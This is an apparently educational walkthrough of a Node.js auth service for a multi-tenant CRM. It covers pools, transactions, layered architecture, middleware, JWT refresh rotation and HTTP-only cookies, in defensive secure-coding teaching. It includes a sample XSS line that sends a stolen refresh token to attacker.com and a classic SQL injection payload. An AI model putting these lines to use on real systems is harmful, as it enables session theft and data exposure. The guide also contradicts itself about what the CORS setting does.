# Backend Deep Dive — Learn Every Concept With Your Own Code

This document explains every backend concept using the actual files in this project.
No generic theory — every example is from your real code.

---

## PART 1 — How a Node.js Service Starts Up

### File: `services/auth-service/src/server.ts`

This is the entry point. When you run `npm run dev:auth`, Node.js executes this file first.

```typescript
// Step 1: Load environment variables from .env file
dotenv.config({ path: path.resolve(__dirname, "../.env") });

// Step 2: Validate all required env vars exist
const env = loadEnv();

// Step 3: Connect to PostgreSQL
const pool = createPool(env.DATABASE_URL);

// Step 4: Connect to Redis
const redis = new Redis(env.REDIS_URL, { maxRetriesPerRequest: 2 });

// Step 5: Create tables if they don't exist
await runMigrations(pool);

// Step 6: Build the dependency tree (bottom-up)
const tokens = new TokenService(env, redis);       // needs env + redis
const authService = new AuthService(env, pool, tokens); // needs env + pool + tokens
const controller = new AuthController(authService);     // needs authService
const app = createApp(controller);                      // needs controller

// Step 7: Start listening for HTTP requests
const server = app.listen(env.PORT, () => {
  logger.info({ port: env.PORT }, "auth-service listening");
});
```

**Why this order matters:**
- You can't create `AuthService` before you have a database pool
- You can't create `AuthController` before you have `AuthService`
- You can't start the server before migrations run (tables must exist)

**Graceful shutdown:**
```typescript
const shutdown = async () => {
  server.close();      // Stop accepting new requests
  await pool.end();    // Close all DB connections
  redis.disconnect();  // Close Redis connection
  process.exit(0);     // Exit cleanly
};

process.on("SIGINT", shutdown);   // Ctrl+C in terminal
process.on("SIGTERM", shutdown);  // Docker/OS kill signal
```
This ensures no requests are cut off mid-flight when you stop the service.

---

## PART 2 — Environment Variables & Validation

### File: `services/auth-service/src/config/env.ts`

**The problem:** If `DATABASE_URL` is missing, the service crashes with a confusing error deep in the pg library. Better to catch it immediately at startup with a clear message.

**The solution — Zod schema validation:**

```typescript
const envSchema = z.object({
  NODE_ENV: z.enum(["development", "production", "test"]).default("development"),
  PORT: z.coerce.number().default(3001),  // coerce = convert "3001" string to number 3001
  DATABASE_URL: z.string().min(1),         // must exist and not be empty
  JWT_ACCESS_SECRET: z.string().min(32),   // must be at least 32 chars (security requirement)
  JWT_REFRESH_SECRET: z.string().min(32),
});

export function loadEnv(): Env {
  const parsed = envSchema.safeParse(process.env);
  if (!parsed.success) {
    // Throws immediately with a clear list of what's missing
    throw new Error(`Invalid auth-service environment: ${parsed.error.message}`);
  }
  return parsed.data;
}
```

**What `z.coerce.number()` does:**
Environment variables are always strings. `PORT=3001` in .env is the string `"3001"`.
`z.coerce.number()` converts it to the number `3001` automatically.

**What `.default()` does:**
If the variable is not set at all, use this value instead of throwing an error.

---

## PART 3 — Database Connection Pool

### File: `services/auth-service/src/db/pool.ts`

**What is a connection pool?**

Opening a database connection is expensive (takes ~50ms). If every request opened and closed its own connection, your service would be slow.

A pool keeps a set of connections open and reuses them:

```
Request 1 → borrows connection #1 → runs query → returns connection #1
Request 2 → borrows connection #2 → runs query → returns connection #2
Request 3 → waits if all 20 are busy → gets one when available
```

```typescript
export function createPool(databaseUrl: string) {
  return new pg.Pool({
    connectionString: databaseUrl,
    max: 20,              // Maximum 20 simultaneous connections
    idleTimeoutMillis: 30_000,  // Close idle connections after 30 seconds
  });
}
```

**Transactions — the most important concept in databases:**

```typescript
export async function withTransaction<T>(
  pool: DbPool,
  fn: (client: pg.PoolClient) => Promise<T>
): Promise<T> {
  const client = await pool.connect(); // Borrow a connection
  try {
    await client.query("BEGIN");       // Start transaction
    const result = await fn(client);   // Run your queries
    await client.query("COMMIT");      // Save all changes
    return result;
  } catch (e) {
    await client.query("ROLLBACK");    // Undo ALL changes if anything failed
    throw e;
  } finally {
    client.release();                  // Always return connection to pool
  }
}
```

**Why transactions matter — real example from your code:**

During registration, two things must happen together:
1. Create tenant in `tenants` table
2. Create user in `users` table

If step 1 succeeds but step 2 fails (e.g. duplicate email), you'd have a tenant with no user — broken data.

With a transaction, if step 2 fails, step 1 is automatically rolled back. Either both succeed or neither does.

```typescript
// In authService.ts — this is a transaction
const result = await withTransaction(this.pool, async (client) => {
  const tenant = await this.tenants.create(client, name, slug); // Step 1
  const user = await this.users.create(client, tenant.id, email, hash); // Step 2
  return { tenantId: tenant.id, userId: user.id };
  // If step 2 throws → ROLLBACK → tenant is deleted too
});
```

---

## PART 4 — The Architecture Pattern: Controller → Service → Repository

Every service follows this 3-layer pattern. Each layer has one job.

```
HTTP Request
     ↓
Controller    → "What does the HTTP request want? Parse it, call service, send response"
     ↓
Service       → "What is the business logic? Validate rules, coordinate operations"
     ↓
Repository    → "How do we talk to the database? Write the SQL"
     ↓
PostgreSQL
```

### Layer 1: Repository — Only SQL

### File: `services/auth-service/src/repositories/userAuthRepository.ts`

```typescript
export class UserAuthRepository {
  constructor(private readonly pool: DbPool) {}

  // Only job: run SQL and return typed results
  async create(client, tenantId, email, passwordHash): Promise<UserAuthRow> {
    const res = await client.query<UserAuthRow>(
      `INSERT INTO users (tenant_id, email, password_hash)
       VALUES ($1, lower(trim($2)), $3)
       RETURNING id, tenant_id, email, password_hash, created_at, updated_at`,
      [tenantId, email, passwordHash]  // $1, $2, $3 are parameterized — prevents SQL injection
    );
    return res.rows[0];
  }

  async findByEmailAcrossTenants(email: string): Promise<UserAuthRow | null> {
    const res = await this.pool.query<UserAuthRow>(
      `SELECT id, tenant_id, email, password_hash, created_at, updated_at
       FROM users WHERE lower(email) = lower(trim($1))
       ORDER BY created_at ASC
       LIMIT 1`,
      [email]
    );
    return res.rows[0] ?? null;  // Return null if not found (not undefined)
  }
}
```

**Why `$1, $2, $3` instead of string interpolation?**

NEVER do this:
```typescript
// DANGEROUS — SQL Injection attack possible
`SELECT * FROM users WHERE email = '${email}'`
// If email = "' OR '1'='1" → returns all users!
```

Always do this:
```typescript
// SAFE — pg library escapes the value
`SELECT * FROM users WHERE email = $1`, [email]
```

**Why `lower(trim($2))`?**
- `trim()` removes spaces: `"  user@email.com  "` → `"user@email.com"`
- `lower()` makes it case-insensitive: `"User@Email.COM"` → `"user@email.com"`
- So `User@Email.com` and `user@email.com` are treated as the same email

### Layer 2: Service — Business Logic

### File: `services/auth-service/src/services/authService.ts`

```typescript
export class AuthService {
  async register(input: { email, password, organizationName, firstName, lastName }) {

    // Business rule 1: Hash the password before storing
    // NEVER store plain text passwords
    const passwordHash = await bcrypt.hash(input.password, BCRYPT_ROUNDS);
    //                                                      ^^^^^^^^^^^^
    //                                                      12 rounds = ~250ms per hash
    //                                                      Slow on purpose — makes brute force hard

    // Business rule 2: Generate a unique URL-safe slug
    const slug = slugifyOrganization(input.organizationName);
    // "Acme Inc!" → "acme-inc-a3f2b1"

    // Business rule 3: Create tenant + user atomically (transaction)
    const result = await withTransaction(this.pool, async (client) => {
      const tenant = await this.tenants.create(client, name, slug);
      const user = await this.users.create(client, tenant.id, email, passwordHash);
      return { tenantId: tenant.id, userId: user.id };
    });

    // Business rule 4: Create user profile in user-service
    // If this fails, roll back the auth records
    try {
      await this.usersClient.bootstrapUser({ ...profile, roleName: "admin" });
    } catch (e) {
      // Manual rollback because we're outside the transaction now
      await this.pool.query(`DELETE FROM users WHERE id = $1`, [userId]);
      await this.pool.query(`DELETE FROM tenants WHERE id = $1`, [tenantId]);
      throw e;
    }

    // Business rule 5: Issue JWT tokens
    const pair = await this.tokens.issueTokenPair({ userId, tenantId, email, role: "admin" });

    return { ...pair, tenantId, tenantSlug, userId };
  }
}
```

**Notice:** The service doesn't know about HTTP. No `req`, no `res`. It just takes plain objects and returns plain objects. This makes it easy to test.

### Layer 3: Controller — HTTP Handling

### File: `services/auth-service/src/controllers/authController.ts`

```typescript
export class AuthController {
  constructor(private readonly auth: AuthService) {}

  register = async (req: Request, res: Response, next: NextFunction) => {
    try {
      // 1. Call the service with the validated request body
      const result = await this.auth.register(req.body);

      // 2. Set the refresh token as an HTTP-only cookie
      setRefreshCookie(res, result.refreshToken, { maxAgeSec: result.refreshTtlSec, secure: false });

      // 3. Send the success response
      return sendSuccess(res, { accessToken: result.accessToken, ... }, "Registered successfully", 201);

    } catch (e) {
      // 4. Pass errors to the error handler middleware
      return next(e);
      // DO NOT handle errors here — let errorHandler.ts do it
    }
  };
}
```

**Why `next(e)` instead of `res.status(500).json(...)`?**

If you handle errors in every controller, you repeat the same code everywhere. Instead, pass the error to `next()` and let the centralized `errorHandler` middleware deal with it once.

---

## PART 5 — Middleware

Middleware is a function that runs between the request arriving and your route handler running.

```
Request → middleware1 → middleware2 → middleware3 → route handler → Response
```

Each middleware calls `next()` to pass control to the next one, or sends a response to stop the chain.

### Middleware 1: Helmet (Security Headers)

```typescript
app.use(helmet());
```

Automatically adds HTTP headers that protect against common attacks:
- `X-Content-Type-Options: nosniff` → prevents MIME sniffing
- `X-Frame-Options: SAMEORIGIN` → prevents clickjacking
- `Strict-Transport-Security` → forces HTTPS

### Middleware 2: CORS

```typescript
app.use(cors({ origin: false, credentials: true }));
```

`origin: false` means the auth-service rejects all cross-origin requests. Only the API Gateway (same machine) can call it. The gateway handles CORS with the frontend.

### Middleware 3: Rate Limiting

```typescript
app.use(rateLimit({
  windowMs: 60_000,  // 1 minute window
  limit: 120,        // Max 120 requests per minute per IP
}));
```

If someone sends 121 requests in a minute, they get `429 Too Many Requests`. Protects against brute force attacks on login.

### Middleware 4: Request Validation

### File: `services/auth-service/src/middlewares/validateRequest.ts`

```typescript
export function validateRequest(schema: AnyZodObject, source: "body" | "query" = "body") {
  return (req: Request, res: Response, next: NextFunction) => {

    // Parse and validate the request body against the schema
    const parsed = schema.safeParse(source === "body" ? req.body : req.query);

    if (!parsed.success) {
      // Return 422 with details of what's wrong
      return sendError(res, "VALIDATION_ERROR", parsed.error.message, 422);
    }

    // Replace req.body with the validated + typed data
    req.body = parsed.data;

    // Continue to the next middleware/controller
    return next();
  };
}
```

**How it's used in routes:**

```typescript
r.post("/register",
  validateRequest(registerSchema),  // ← runs first, validates body
  controller.register               // ← only runs if validation passes
);
```

If someone sends `{ email: "not-an-email" }`, `validateRequest` returns a 422 error immediately. `controller.register` never runs.

### Middleware 5: Error Handler

### File: `services/auth-service/src/middlewares/errorHandler.ts`

```typescript
export function errorHandler(err: unknown, _req: Request, res: Response, _next: NextFunction) {
  // Is it one of our known errors?
  if (err instanceof AppError) {
    return sendError(res, err.code, err.message, err.statusCode);
    // ConflictError → 409, UnauthorizedError → 401, etc.
  }

  // Unknown error — log it and return generic 500
  logger.error({ err }, "unhandled error");
  return sendError(res, "INTERNAL_ERROR", "Unexpected error", 500);
}
```

**Important:** Error handler middleware has 4 parameters `(err, req, res, next)`. Express identifies it as an error handler because of the 4th parameter. It must be registered LAST with `app.use(errorHandler)`.

---

## PART 6 — Custom Error Classes

### File: `services/auth-service/src/utils/errors.ts`

```typescript
// Base class — all our errors extend this
export class AppError extends Error {
  constructor(
    public readonly code: string,    // Machine-readable: "UNAUTHORIZED"
    message: string,                  // Human-readable: "Invalid credentials"
    public readonly statusCode: number = 400
  ) {
    super(message);
    this.name = "AppError";
  }
}

// Specific errors with preset codes and status codes
export class UnauthorizedError extends AppError {
  constructor(message = "Unauthorized") {
    super("UNAUTHORIZED", message, 401);
  }
}

export class ConflictError extends AppError {
  constructor(message: string) {
    super("CONFLICT", message, 409);
  }
}

export class ForbiddenError extends AppError {
  constructor(message = "Forbidden") {
    super("FORBIDDEN", message, 403);
  }
}
```

**How it flows:**

```typescript
// In authService.ts
if (!passwordMatch) {
  throw new UnauthorizedError("Invalid credentials");
  // statusCode = 401, code = "UNAUTHORIZED"
}

// In authController.ts
} catch (e) {
  return next(e);  // Passes to errorHandler
}

// In errorHandler.ts
if (err instanceof AppError) {
  return sendError(res, err.code, err.message, err.statusCode);
  // Sends: { success: false, error: { code: "UNAUTHORIZED", message: "Invalid credentials" } }
  // HTTP status: 401
}
```

---

## PART 7 — JWT Tokens (The Most Important Auth Concept)

### File: `services/auth-service/src/services/tokenService.ts`

**What is a JWT?**

A JWT (JSON Web Token) is a string with 3 parts separated by dots:
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyLTEyMyJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
     HEADER                    PAYLOAD                        SIGNATURE
```

- **Header:** Algorithm used (HS256)
- **Payload:** The data (userId, role, email, expiry) — base64 encoded, NOT encrypted
- **Signature:** HMAC of header+payload using your secret key

Anyone can decode the payload. But they can't fake the signature without knowing the secret.

**Access Token — short lived (15 minutes):**

```typescript
const accessToken = jwt.sign(
  {
    sub: params.userId,      // "sub" = subject (standard JWT claim)
    tid: params.tenantId,    // custom claim: tenant ID
    role: params.role,       // custom claim: "admin" / "manager" / "user"
    email: params.email,
    typ: "access",           // custom claim: token type
    jti: accessJti,          // unique ID for this specific token (for blacklisting)
  },
  this.env.JWT_ACCESS_SECRET,  // Secret key — only auth-service knows this
  { expiresIn: 900 }           // 900 seconds = 15 minutes
);
```

**Refresh Token — long lived (7 days):**

```typescript
const refreshToken = jwt.sign(
  {
    sub: params.userId,
    tid: params.tenantId,
    typ: "refresh",
    jti: refreshJti,         // unique ID
    fib: familyId,           // "family ID" — for detecting token reuse attacks
  },
  this.env.JWT_REFRESH_SECRET,  // Different secret from access token
  { expiresIn: 604800 }         // 604800 seconds = 7 days
);
```

**Why two different secrets?**
If someone steals the access token secret, they can't forge refresh tokens. Defense in depth.

**Token Rotation — how refresh works:**

```typescript
async rotateRefreshToken(refreshToken: string) {
  // 1. Verify the token is valid and not expired
  const decoded = jwt.verify(refreshToken, this.env.JWT_REFRESH_SECRET);

  // 2. Check if this token family was revoked (reuse attack)
  const familyRevoked = await this.redis.get(`fib_revoked:${decoded.fib}`);
  if (familyRevoked) throw new UnauthorizedError("Session revoked");

  // 3. Check if this specific token exists in Redis
  const session = await this.redis.get(`rtjti:${decoded.jti}`);
  if (!session) {
    // Token was already used! Someone is reusing an old token.
    // Revoke the entire family — log out all devices
    await this.redis.setex(`fib_revoked:${decoded.fib}`, TTL, "1");
    throw new UnauthorizedError("Invalid refresh token");
  }

  // 4. Delete the old token (it can never be used again)
  await this.redis.del(`rtjti:${decoded.jti}`);

  // 5. Issue brand new access + refresh tokens
  // Store new refresh session in Redis
  // Return new tokens
}
```

**Why store refresh tokens in Redis?**

JWTs are stateless — you can't "cancel" them once issued. If a user logs out, their access token is still valid for 15 minutes.

Redis solves this:
- Refresh tokens are stored in Redis with their `jti` as the key
- On logout: delete from Redis → token is immediately invalid
- On refresh: check Redis first → if not there, reject

---

## PART 8 — HTTP-Only Cookies

### File: `services/auth-service/src/utils/cookies.ts`

```typescript
export function setRefreshCookie(res: Response, refreshToken: string, options) {
  res.cookie("crm_rt", refreshToken, {
    httpOnly: true,   // JavaScript CANNOT read this cookie (prevents XSS theft)
    sameSite: "lax",  // Sent on same-site requests + top-level navigation
    secure: false,    // true in production (HTTPS only)
    path: "/api/v1/auth",  // Cookie only sent to this path
    maxAge: options.maxAgeSec * 1000,  // Expiry in milliseconds
  });
}
```

**Why HTTP-only?**

If you store the refresh token in `localStorage`, any JavaScript on the page can read it:
```javascript
// XSS attack — malicious script injected into your page
fetch("https://attacker.com/steal?token=" + localStorage.getItem("refreshToken"));
```

With `httpOnly: true`, JavaScript cannot access the cookie at all. Only the browser sends it automatically with requests.

**Why `path: "/api/v1/auth"`?**

The browser only sends this cookie when the request URL starts with `/api/v1/auth`. It won't be sent to `/api/v1/crm/tasks` — reducing exposure.

---

## PART 9 — Routes

### File: `services/auth-service/src/routes/authRoutes.ts`

```typescript
export function buildAuthRouter(controller: AuthController) {
  const r = Router();

  // Chain: validateRequest runs first, then controller.register
  r.post("/register", validateRequest(registerSchema), controller.register);
  r.post("/login",    validateRequest(loginSchema),    controller.login);
  r.post("/refresh",  validateRequest(refreshSchema),  controller.refresh);
  r.post("/logout",   validateRequest(logoutSchema),   controller.logout);

  return r;
}
```

**Mounted in app.ts:**
```typescript
app.use("/api/v1/auth", buildAuthRouter(controller));
```

So `r.post("/register")` becomes `POST /api/v1/auth/register`.

**Zod schemas define what's allowed:**

```typescript
const registerSchema = z.object({
  email: z.string().email().max(320),      // Must be valid email, max 320 chars
  password: z.string().min(8).max(128),    // 8-128 chars
  organizationName: z.string().min(2).max(120),
  firstName: z.string().min(1).max(80),
  lastName: z.string().min(1).max(80),
});
```

If the request body has extra fields like `{ email, password, isAdmin: true }`, Zod strips `isAdmin` automatically. You can't inject extra fields.

---

## PART 10 — Consistent Response Format

### File: `services/auth-service/src/utils/response.ts`

Every API response follows the same structure:

```typescript
// Success
export function sendSuccess<T>(res: Response, data: T, message = "", status = 200) {
  return res.status(status).json({
    success: true,
    data,        // The actual payload
    message,     // Human-readable description
  });
}

// Error
export function sendError(res: Response, code: string, message: string, status = 400) {
  return res.status(status).json({
    success: false,
    error: {
      code,      // Machine-readable: "VALIDATION_ERROR", "UNAUTHORIZED"
      message,   // Human-readable: "Email is required"
    },
  });
}
```

**Why consistent format?**

The frontend can always check `response.data.success` to know if it worked. It doesn't need to check HTTP status codes in different ways for different endpoints.

---

## PART 11 — Logging

### File: `services/auth-service/src/utils/logger.ts`

```typescript
import pino from "pino";

export const logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
});
```

**Pino** is a structured JSON logger. Instead of:
```
[2024-01-15] auth-service listening on port 3001
```

It outputs:
```json
{"level":30,"time":1778940700828,"pid":12588,"port":3001,"msg":"auth-service listening"}
```

**Why JSON logs?**
- Easy to search: `grep '"msg":"auth-service"'`
- Easy to parse in log aggregation tools (Datadog, CloudWatch)
- Includes timestamp, process ID, and custom fields automatically

**Log levels:**
```typescript
logger.info(...)   // Normal operations
logger.warn(...)   // Something unexpected but not breaking
logger.error(...)  // Something broke
logger.debug(...)  // Detailed info for debugging (disabled in production)
```

---

## PART 12 — The Complete Request Lifecycle

Let's trace `POST /api/v1/auth/register` through every layer:

```
1. Browser sends POST to localhost:3000/api/v1/auth/register

2. API Gateway receives it
   → No body parsing (express.json removed)
   → Path rewrite: /register → /api/v1/auth/register
   → Proxy to localhost:3001

3. Auth Service receives POST /api/v1/auth/register
   → helmet() adds security headers
   → cors() checks origin (false = allow all internal)
   → compression() sets up gzip
   → express.json() parses body: { email, password, organizationName, ... }
   → rateLimit() checks: has this IP sent too many requests?
   → pinoHttp() logs the incoming request

4. Router matches POST /api/v1/auth/register
   → validateRequest(registerSchema) runs
   → Zod validates body: is email valid? is password 8+ chars?
   → If invalid: return 422 immediately
   → If valid: req.body = cleaned data, call next()

5. controller.register runs
   → Calls authService.register(req.body)

6. authService.register runs
   → bcrypt.hash(password, 12) — takes ~250ms
   → slugifyOrganization("Acme Inc") → "acme-inc-a3f2b1"
   → withTransaction:
      → INSERT INTO tenants → gets tenantId
      → INSERT INTO users → gets userId
      → COMMIT
   → fetch to user-service:
      POST localhost:3002/internal/api/v1/users/bootstrap
      { id: userId, tenantId, email, firstName, lastName, roleName: "admin" }
   → tokenService.issueTokenPair:
      → jwt.sign(accessPayload) → accessToken
      → jwt.sign(refreshPayload) → refreshToken
      → redis.setex("rtjti:uuid", 604800, sessionJSON)
   → Returns { accessToken, refreshToken, tenantId, userId, tenantSlug }

7. controller.register continues
   → setRefreshCookie(res, refreshToken) → sets HTTP-only cookie
   → sendSuccess(res, { accessToken, tenantId, userId }, "Registered", 201)

8. Response travels back through gateway to browser
   → Browser receives: { success: true, data: { accessToken, ... } }
   → Browser stores accessToken in Zustand
   → Browser redirects to /tasks
```

---

## PART 13 — Key Concepts Summary

| Concept | What it is | Where in your code |
|---|---|---|
| **Connection Pool** | Reuse DB connections instead of opening new ones | `db/pool.ts` |
| **Transaction** | All-or-nothing group of DB operations | `withTransaction()` in pool.ts |
| **Repository Pattern** | Class that only contains SQL queries | `repositories/*.ts` |
| **Service Layer** | Business logic, no HTTP knowledge | `services/authService.ts` |
| **Controller** | Handles HTTP req/res, calls service | `controllers/authController.ts` |
| **Middleware** | Function that runs before route handler | `middlewares/*.ts` |
| **Zod Validation** | Validate + type-check incoming data | `validateRequest.ts`, `config/env.ts` |
| **JWT** | Signed token carrying user identity | `services/tokenService.ts` |
| **HTTP-only Cookie** | Cookie JS can't read (refresh token) | `utils/cookies.ts` |
| **Token Rotation** | Each refresh issues new tokens, old ones deleted | `rotateRefreshToken()` |
| **Token Blacklist** | Redis stores invalidated access tokens | `denylistAccessJti()` |
| **Error Classes** | Typed errors with HTTP status codes | `utils/errors.ts` |
| **Structured Logging** | JSON logs with metadata | `utils/logger.ts` |
| **Graceful Shutdown** | Close connections before exiting | `server.ts` SIGINT/SIGTERM |
| **Rate Limiting** | Block too many requests from one IP | `app.ts` rateLimit() |
| **Parameterized Queries** | `$1, $2` prevents SQL injection | All repository files |
| **Soft Delete** | Set `deleted_at` instead of DELETE | `crm_db` leads/tasks tables |
| **Multi-tenancy** | Every query filtered by `tenant_id` | All CRM/user repositories |
| **Internal Secret** | Service-to-service auth header | `x-internal-secret` header |
